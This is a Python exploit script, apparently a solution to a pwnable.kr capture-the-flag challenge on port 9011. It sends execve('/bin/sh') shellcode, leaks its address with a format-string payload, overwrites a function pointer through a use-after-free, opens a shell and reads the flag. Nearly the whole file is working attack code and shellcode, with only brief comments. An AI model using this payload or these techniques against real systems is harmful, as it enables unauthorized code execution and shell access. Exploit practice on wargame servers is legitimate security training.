import socket, struct

HOST = 'pwnable.kr'
PORT = 9011
chunk = 1024
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
padding = (24-len(shellcode)) * '\x90'

def main():
	
	s = socket.socket()
	s.connect((HOST,PORT))
	print ("Connected, Activating..")
	# receive welcome name
	s.recv(chunk)
	s.send(shellcode+padding+'\n')
	# receive echo types
	s.recv(chunk)
	s.recv(chunk)
	# trigger fsb
	s.send('2\n')
	# receive hello name
	s.recv(chunk)

	# leak shellcode address:
	s.send('BBBB%9$016llx'+'\n')
	data = s.recv(chunk)[8:]
	addr = (int(data,16)-0x20)
	sc_addr = struct.pack("<Q", addr)
	print(sc_addr)

	# trigger free()
	data = s.recv(chunk)
	s.send('4\n')
	data = s.recv(chunk)
	s.send('n\n')
	data = s.recv(chunk)
	data = s.recv(chunk)
	
	# overwrite greetings() using uaf
	s.send('3\n')
	data = s.recv(chunk)
	payload = 'A' * 24 + sc_addr + '\n'
	s.send(payload)

	data = s.recv(chunk)
	data = s.recv(chunk)
	
	# trigger greetings() - get shell
	s.send('3\n')

	s.send('cat flag\n')
	flag = s.recv(chunk)
	print(flag)
	flag = s.recv(chunk)
	print(flag)
	

	return

if __name__ == '__main__':
	main()